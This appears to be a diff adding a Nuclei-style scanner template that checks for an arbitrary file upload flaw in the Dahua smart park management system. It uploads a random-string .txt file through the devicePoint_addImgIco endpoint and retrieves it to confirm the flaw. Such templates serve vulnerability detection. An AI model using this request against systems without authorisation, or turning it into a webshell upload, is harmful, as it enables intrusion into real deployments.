@@ -1,0 +1,52 @@
+id: dahua-smart-park-addimgico-upload
+
+info:
+  name: 大华智慧园区管理系统 addimgico 任意文件上传
+  author: SleepingBag945
+  severity: critical
+  description: |
+    大华智慧园区管理系统 addimgico 任意文件上传
+  tags: rce,upload
+
+http:
+  - raw:
+      - |
+        POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{randstr_1}}
+
+        --{{randstr_1}}
+        Content-Disposition: form-data; name="upload"; filename="t.txt"
+        Content-Type: application/octet-stream
+        Content-Transfer-Encoding: binary
+
+        {{randstr_2}}
+        --{{randstr_1}}--
+
+      - |
+        GET /upload/emap/society_new/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: filename
+        internal: true
+        part: body_1
+        group: 1
+        regex:
+          - '"data":"(.*?).txt"'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - '"code"'
+          - '"data"'
+        condition: and
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr_2}}'
+        condition: and
+
